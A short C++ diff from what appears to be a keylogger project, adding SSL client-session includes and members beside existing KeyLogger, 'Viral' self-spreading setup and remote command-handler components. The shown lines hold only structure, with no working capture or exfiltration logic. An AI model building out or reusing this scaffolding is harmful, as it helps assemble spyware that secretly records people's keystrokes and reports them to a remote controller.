@@ -8,6 +8,8 @@
 #include <boost/asio.hpp>
 #include <boost/asio/ssl.hpp>
 #include <Protocol/CommandHandler.hpp>
+#include <Network/SSLConnection.hpp>
+#include <Network/ClientSession.hpp>
 #include "KeyLogger.hpp"
 #include "KeyLoggerFactory.hpp"
 #include "LogHandle.hpp"
@@ -38,6 +40,7 @@ namespace spi
         }
 
     private:
+
         void __setup()
         {
             _viral.setup();
@@ -49,7 +52,9 @@ namespace spi
     private:
         // TODO : add the acceptor for server command
         // TODO : add the ssl socket
-        spi::net::IOManager _service;
+        net::IOManager _service;
+        spi::net::SSLContext _ctx{spi::net::SSLContext::SSLv23Client};
+        std::unique_ptr<ClientSession> _clientSession{std::make_unique<ClientSession>(_ctx, _service)};
         LogHandle _logHandle;
         Viral _viral;
         CommandHandler _cmdHandler;
